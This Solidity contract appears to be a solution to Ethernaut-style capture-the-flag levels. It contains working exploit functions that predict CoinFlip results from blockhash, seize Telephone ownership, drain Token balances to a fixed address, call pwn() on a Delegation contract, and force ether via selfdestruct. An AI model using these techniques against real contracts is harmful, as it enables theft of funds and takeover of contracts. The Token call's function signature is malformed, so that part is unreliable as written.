// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract FlipCoinAnapoda is Ownable {
    using SafeMath for uint256;
    address contractAddressCoinFlip =
        0xa1977AddD4052cD4Db3d174b84A6C6c83eF39F8d;
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address alxAddr = 0x82688Ed8427E2dB9fb5F2b9527361f55B40D90D5;
    event FlipCoinResult(bool reslut);

    constructor() {
        consecutiveWins = 0;
    }

    event Received(address caller, uint256 amount, string message);
    event Destruct(address caller, string message);

    // ) public onlyOwner returns (uint256) {
    function sendTokenToContract(address contrAddr) public onlyOwner {
        emit Destruct(msg.sender, "Contract selfdestruct received");
        selfdestruct(payable(contrAddr));
    }

    // fallback() external payable {
    //     emit Received(msg.sender, msg.value, "Fallback was called");
    // }

    receive() external payable {
        emit Received(msg.sender, msg.value, "receive was called");
    }

    function stillTokens() public returns (bool isTransfered) {
        address contrAddr = 0x63bE8347A617476CA461649897238A31835a32CE; //20999980
    
        (bool success, ) = contrAddr.call(
            abi.encodeWithSignature("transfer(address, uint)", alxAddr, 1000000)
        );
        return success; //token.transfer(fromAddr, 1000000);
    }

    function callDelegation(address contrAddr) public returns(bool){
       (bool success, ) = contrAddr.call(
            abi.encodeWithSignature("pwn()")
        );
        return success;
    }

    function getTelephone() public {
        address _contractAddr = 0xC7088d461eae97142Bc3a93B033d023DA9A28743;
        Telephone tel = Telephone(_contractAddr);
        tel.changeOwner(alxAddr);
    }

    function callFlipCoinContract(address addr) public {
        CoinFlip c = CoinFlip(addr);
        bool _guess = flipMe();
        bool _result = c.flip(_guess);

        emit FlipCoinResult(_result);
    }

    function someUnsafeAction(address addr) public {
        bool _guess = flipMe();
        (bool success, ) = addr.call(
            abi.encodeWithSignature("flip(bool)", _guess)
        );

        emit FlipCoinResult(success);
    }

    function flipMe() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        return side;
    }
}

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

interface Telephone {
    function changeOwner(address _owner) external;
}

interface Token {
    function transfer(address _to, uint256 _value) external returns (bool);
}

interface Delegation {
    function lala() external;
}
